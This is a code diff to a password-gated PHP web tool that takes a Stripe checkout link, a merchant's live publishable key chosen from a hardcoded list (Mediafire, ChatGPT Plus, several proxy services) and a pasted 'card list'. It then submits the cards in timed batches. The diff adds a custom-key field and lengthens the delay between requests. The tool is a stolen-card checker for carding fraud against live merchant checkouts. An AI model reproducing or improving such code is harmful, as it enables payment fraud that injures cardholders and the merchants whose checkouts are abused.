@@ -169,8 +169,9 @@ echo '<!DOCTYPE html>
             Checkout Link:<br>
             <input type="text" name="url" placeholder="https://checkout.stripe.com/c/pay/cs_live_a15Y1IYZwo4SGlMCIQm4EVSlDsU4bd1FhjEacYvmFE0ODxth5GaIa4r8lF#fidkdWxOYHwnPyd1blppbHNgWmpiaXFXb30zREJobWxuUUtPZ2JBTFxPTDU1MEA3Z0dTf0QnKSdobGF2Jz9%2BJ2JwbGEnPydLRCcpJ2hwbGEnPydLRCcpJ3ZsYSc%2FJ0tEJ3gpJ2dgcWR2Jz9eWCknaWR8anBxUXx1YCc%2FJ3Zsa2JpYFpscWBoJyknd2BjYHd3YHdKd2xibGsnPydtcXF1dj8qKnJycit2cWprYHdgZGErZmpoJ3gl" required><br>
             PK Live Key:<br>
-            <select name="pk_live_key">
-            <option selected disabled hidden>Select PK Options</option>
+            <select name="pk_live_key_select" id="pk_live_key_select">
+            <option disabled selected hidden>Select PK Options</option>
+            <option value="">I will provide my own pk_live</option>
             <option value="pk_live_rHudX0Gd50MtPyISpIBdShXq">Mediafire</option>
             <option value="pk_live_ogltRjx6AGmhikTNJbgDIYJI005E2bBVzA">Moviebox</option>
             <option value="pk_live_51HOrSwC6h1nxGoI3lTAgRjYVrz4dU3fVOabyCcKR3pbEJguCVAlqCxdxCUvoRh1XWwRacViovU3kLKvpkjh7IqkW00iXQsjo3n">ChatGPT Plus</option>
@@ -185,8 +186,27 @@ echo '<!DOCTYPE html>
             <option value="pk_live_51McKbyIj7RaCgFGVFRur9zCpNqqXAievH3zLpgf1WpmtcIIYIFlzFiKUHUuxly3zss78QnZtr8AaqHkJvRRchjSG00nQrHQcPW">nat.dev</option>
             <option value="pk_live_5C5OBFQIejDjAbVnFmZGpcRg">instaproxy</option>
             <option value="pk_live_51JbCOgG4xVdWcYVX7t5gYnyeM2EjwUKgKecEMPHBII5ym8CgfLbo1SCTDfqsLlISxfWruslI2Riz7SOIzwu86eRr00WLhP8xHm">juproxy</option>
-            <option>I will provide my own pk_live</option>
             </select>
+            <span id="custom_pk_label" style="display: none;">Enter your own pk_live_key</span><br>
+            <input type="text" style="display: none;" id="custom_pk_live" placeholder="pk_live_NjCA1yGv5ie85lOhnTt2E11z005pitDerS" name="pk_live_key" autocomplete="off" required>
+            <script>
+			    const selectElement = document.getElementById("pk_live_key_select");
+			    const customPkInput = document.getElementById("custom_pk_live");
+			    const customPkLabel = document.getElementById("custom_pk_label");
+
+			    selectElement.addEventListener("change", function() {
+			        const selectedOption = selectElement.options[selectElement.selectedIndex].value;
+			        if (selectedOption === "") {
+			            customPkInput.style.display = "block";
+			            customPkInput.setAttribute("required", true);
+			            customPkLabel.style.display = "inline-block";
+			        } else {
+			            customPkInput.style.display = "none";
+			            customPkInput.removeAttribute("required");
+			            customPkLabel.style.display = "none";
+			        }
+			    });
+			</script>
         </div>
         <input type="submit" value="Proceed"><br><br>
         Is your Stripe PK not here?<br>
@@ -194,8 +214,9 @@ echo '<!DOCTYPE html>
     </form>';
 };
 // this is the page when successfully entered the correct password & url
+
 if (isset($_POST['pass']) && $_POST['pass'] === 'amacanaaclaa'
-    && isset($_POST['url']) && !empty($_POST['url']) && isset($_POST['pk_live_key']) && !empty($_POST['pk_live_key'])) {
+    && isset($_POST['url']) && !empty($_POST['url'])) {
 ?>
 <!DOCTYPE html>
 <html class="loading">
@@ -392,12 +413,11 @@ if ($risk !== null) {
 			<div class="card">
 				<div class="card-body text-center">
 					<textarea rows="6" class="form-control text-center form-checker mb-2" placeholder="PUT YOUR CARD LIST HERE :>"></textarea>
-					
+				
 					<div class="input-group mb-1">
 <?php
 
 // get the cs key value
-$pk_live_key = isset($_POST['pk_live_key']) ? $_POST['pk_live_key'] : '';
 $url = isset($_POST['url']) ? $_POST['url'] : '';
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $url);
@@ -412,12 +432,19 @@ if (count($parts) > 0) {
 }
 
 // get the pk key value
-// ginagawa pa
+$pk_live_key = isset($_POST['pk_live_key']) ? $_POST['pk_live_key'] : '';
+$pk_live_key_select = isset($_POST['pk_live_key_select']) ? $_POST['pk_live_key_select'] : '';
+$pk_key = "";
+if (!empty($pk_live_key)) {
+  $pk_key = $pk_live_key;
+} else if (!empty($pk_live_key_select)) {
+  $pk_key = $pk_live_key_select;
+}
 
 // patch the values of cs & pk
 
 					echo '<input type="text" style="background-color:#112132;" class="form-control" id="cslive" placeholder="" name="cslive" value="'.$cs_live_value.'">&nbsp;       
-										<input type="text" style="background-color:#112132;" class="form-control" id="pklive" placeholder="pk_live_xxxxx" name="pklive" autocomplete="off" value="'.$pk_live_key.'">';
+										<input type="text" style="background-color:#112132;" class="form-control" id="pklive" placeholder="pk_live_xxxxx" name="pklive" autocomplete="off" value="'.$pk_key.'">';
 ?>
                     </div>
                     
@@ -706,7 +733,7 @@ var callBack = $.ajax({
         location.reload();
     }, 3000); // 5000 milliseconds = 5 seconds
       	});
-	}, 3000 * index);
+	}, 4500 * index);
 		});
 	});
 });
